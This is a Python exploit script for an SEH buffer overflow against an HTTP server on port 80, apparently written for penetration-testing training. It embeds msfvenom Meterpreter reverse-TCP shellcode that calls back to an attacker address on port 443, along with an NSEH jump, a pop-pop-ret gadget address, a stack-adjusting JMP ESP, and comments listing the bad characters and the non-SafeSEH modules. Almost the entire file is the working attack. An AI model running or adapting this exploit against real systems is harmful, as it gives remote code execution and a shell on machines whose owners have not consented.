#!/usr/bin/python
import socket, sys
from struct import pack

host = sys.argv[1]
port = 80

def send_exploit_request():
	size = 2000
	
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.194 LPORT=443 -b "\x00\x20\x2e\x2f" -f python -v shellcode   
	shellcode =  b"\x90" * 20
	shellcode += b"\xbf\x13\xe9\xec\x8d\xda\xdb\xd9\x74\x24\xf4"
	shellcode += b"\x58\x29\xc9\xb1\x59\x31\x78\x14\x03\x78\x14"
	shellcode += b"\x83\xc0\x04\xf1\x1c\x10\x65\x7a\xde\xe9\x76"
	shellcode += b"\xe4\x56\x0c\x47\x36\x0c\x44\xfa\x86\x46\x08"
	shellcode += b"\xf7\x6d\x0a\xb9\x08\xc6\xe1\xe7\x27\xd7\x7d"
	shellcode += b"\x95\x6f\x16\x42\xf6\x4c\x39\x3e\x05\x81\x99"
	shellcode += b"\x7f\xc6\xd4\xd8\xb8\x90\x93\x35\x14\xa8\x0e"
	shellcode += b"\xd9\xce\x25\xec\xe5\xf1\xe9\x7a\x55\x8a\x8c"
	shellcode += b"\xbd\x21\x26\x8e\xed\x42\xfe\x88\x86\x0c\xdf"
	shellcode += b"\xf8\x99\x7f\x9a\x30\xed\x43\x94\x3d\x47\x30"
	shellcode += b"\xe2\x4a\x59\x90\x3a\x8d\x9b\xd3\x30\xa1\x1d"
	shellcode += b"\x2c\x72\x59\x68\x46\x80\xe4\x6b\x9d\xfa\x32"
	shellcode += b"\xf9\x01\x5c\xb0\x59\xe5\x5c\x15\x3f\x6e\x52"
	shellcode += b"\xd2\x4b\x28\x77\xe5\x98\x43\x83\x6e\x1f\x83"
	shellcode += b"\x05\x34\x04\x07\x4d\xee\x25\x1e\x2b\x41\x59"
	shellcode += b"\x40\x93\x3e\xff\x0b\x36\x28\x7f\xf4\xc8\x55"
	shellcode += b"\xdd\x62\x04\x98\xde\x72\x02\xab\xad\x40\x8d"
	shellcode += b"\x07\x3a\xe8\x46\x8e\xbd\x79\x40\x31\x11\xc1"
	shellcode += b"\x01\xcf\x92\x31\x0b\x14\xc6\x61\x23\xbd\x67"
	shellcode += b"\xea\xb3\x42\xb2\x86\xb9\xd4\xfd\xfe\x93\xe6"
	shellcode += b"\x96\xfc\xeb\xe7\xdd\x89\x0a\xb7\x71\xd9\x82"
	shellcode += b"\x78\x22\x99\x72\x11\x28\x16\xac\x01\x53\xfd"
	shellcode += b"\xc5\xa8\xbc\xab\xbe\x44\x24\xf6\x35\xf4\xa9"
	shellcode += b"\x2d\x30\x36\x21\xc7\xc4\xf9\xc2\xa2\xd6\xee"
	shellcode += b"\xb4\x4c\x27\xef\x50\x4c\x4d\xeb\xf2\x1b\xf9"
	shellcode += b"\xf1\x23\x6b\xa6\x0a\x06\xe8\xa1\xf5\xd7\xd8"
	shellcode += b"\xda\xc0\x4d\x64\xb5\x2c\x82\x64\x45\x7b\xc8"
	shellcode += b"\x64\x2d\xdb\xa8\x37\x48\x24\x65\x24\xc1\xb1"
	shellcode += b"\x86\x1c\xb5\x12\xef\xa2\xe0\x55\xb0\x5d\xc7"
	shellcode += b"\xe5\xb7\xa1\x95\xc1\x1f\xc9\x65\x52\xa0\x09"
	shellcode += b"\x0c\x52\xf0\x61\xdb\x7d\xff\x41\x24\x54\xa8"
	shellcode += b"\xc9\xaf\x39\x1a\x68\xaf\x13\xfa\x34\xb0\x90"
	shellcode += b"\x27\xc7\xcb\xd9\xd8\x28\x2c\xf0\xbc\x29\x2c"
	shellcode += b"\xfc\xc2\x16\xfa\xc5\xb0\x59\x3e\x72\xca\xec"
	shellcode += b"\x63\xd3\x41\x0e\x37\x23\x40"
	
	buffer = b"\x41" * (1236 - len(shellcode))
	buffer += shellcode
	buffer += pack("<L", 0x04eb9090)	# NSEH offset is 1236 
						# (WATCH STACK ALIGNMENT, JUMP BY 4 NOT 6)
						
	buffer += pack("<L", 0x100128f2)	# SEH offset is 1240 - pop edi, pop esi, ret	
	buffer += b"\x90" * 2							
	buffer += b"\x66\x81\xC4\x37\x0A"	# add sp, 0xa37 to jump to NOPS
						# (ALWAYS CHECK STACK ALIGNMENT HERE!!!)
										
	buffer += b"\xff\xe4"			# JMP ESP
	buffer += b"\x43" * (size - len(buffer))	
	
	# BADCHARS IDENTIFIED:
	# \x00
	# \x20	
	# \x2e
	# \x2f
	
	# There are only 2 modules where SafeSEH and other protections are OFF:
	# 00400000 00418000 KNet	/SafeSEH OFF  CAN'T USE. NULL BYTES
	# 10010000 10037000 CRTDLL	/SafeSEH OFF  USED THIS ONE
	
	#HTTP Request
	request  = buffer + b" / HTTP/1.0\r\n\r\n"
 
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,port))
	s.send(request)
	print(s.recv(1024))
	s.close()

if __name__ == "__main__": 
	send_exploit_request()
